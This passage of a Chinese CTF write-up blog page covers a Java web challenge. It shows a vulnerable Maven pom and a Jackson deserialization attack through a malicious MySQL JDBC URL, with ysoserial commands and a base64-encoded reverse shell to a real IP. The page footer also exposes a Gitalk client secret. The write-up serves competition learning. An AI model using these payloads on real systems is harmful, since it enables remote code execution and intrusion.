class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ctf<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.reporing.outputEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.reporing.outputEncoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sparkjava<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-nop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.30<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.15<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-annotations<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-assembly-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>Blog<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">descriptorRef</span>&gt;</span>jar-with-dependencies<span class="tag">&lt;/<span class="name">descriptorRef</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">id</span>&gt;</span>make-assemble<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>single<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">     </span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>使用了Jackson 2.9.9之前的Java应用，如果服务依赖了mysql-connector-java，那么这个服务所在机器上的文件，就可能被任意读取。</p>
+</blockquote>
+<p>commons-collections 是3.2.1</p>
+<p>参考<a href="https://www.jianshu.com/p/dfd6f0ac9f00" target="_blank" rel="noopener">https://www.jianshu.com/p/dfd6f0ac9f00</a></p>
+<p><a href="https://github.com/fnmsd/MySQL_Fake_Server" target="_blank" rel="noopener">https://github.com/fnmsd/MySQL_Fake_Server</a></p>
+<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200625105055219.png" alt="image-20200625105055219"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#DNSlog查看</span><br><span class="line">&#123;&quot;id&quot;:[&quot;com.mysql.cj.jdbc.admin.MiniAdmin&quot;,&quot;jdbc:mysql:&#x2F;&#x2F;144.34.200.151:3306&#x2F;test?autoDeserialize&#x3D;true%20queryInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor%20user&#x3D;yso_URLDNS_http:&#x2F;&#x2F;j5q6o0.dnslog.cn&quot;]&#125;</span><br><span class="line"></span><br><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener  8888 CommonsCollections5 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNDQuMzQuMjAwLjE1MS84ODg4IDA+JjE&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;</span><br><span class="line">#反弹shell</span><br><span class="line">&#123;&quot;id&quot;:[&quot;com.mysql.cj.jdbc.admin.MiniAdmin&quot;,&quot;jdbc:mysql:&#x2F;&#x2F;144.34.200.151:3306&#x2F;test?autoDeserialize&#x3D;true%26queryInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor%26user&#x3D;yso_CommonsCollections6_bash%20-c%20&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNDQuMzQuMjAwLjE1MS84ODg4IDA+JjE&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;]&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200625104839414.png" alt="image-20200625104839414"></p>
+<h1 id="0x05-laravel"><a href="#0x05-laravel" class="headerlink" title="0x05 laravel"></a>0x05 <strong>laravel</strong></h1>
+      
+    </div>
+  </div>
+  <!-- 要添加的内容 -->
+  
+    <div>
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+          <strong>作者:  </strong>Mount4in</a>
+          </li>
+          <li class="post-copyright-link">
+          <strong>文章链接:  </strong>
+          <a href="/2020/06/24/第五空间智能安全大赛Web题解/" target="_blank" title="第五空间智能安全大赛Web题解">http://mount4in.github.io/2020/06/24/第五空间智能安全大赛Web题解/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>版权声明:   </strong>
+            本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+            许可协议。转载请注明出处!
+          </li>
+        </ul>
+      <div>
+
+  
+  <!---->
+    <footer class="article-footer">
+      <a data-url="http://mount4in.github.io/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/" data-id="clg20p605002b14uvb1d1bjkr"
+         class="article-share-link">Share</a>
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+
+    </footer>
+
+
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer</strong>
+        <div class="article-nav-title">
+          
+            2020 TCTF0CTF Web题目复现
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">De1CTF Animal Crossing 复现</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: 'b7d32ae2538e1a71f462',
+      clientSecret: 'da0452b610458a4ccbc38598fb0d02f0eb9e653d',
+      repo: 'gitalk',
+      owner: 'Mount4in',
+      admin: ['Mount4in'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2023 Mount4in</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="Mount4in"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
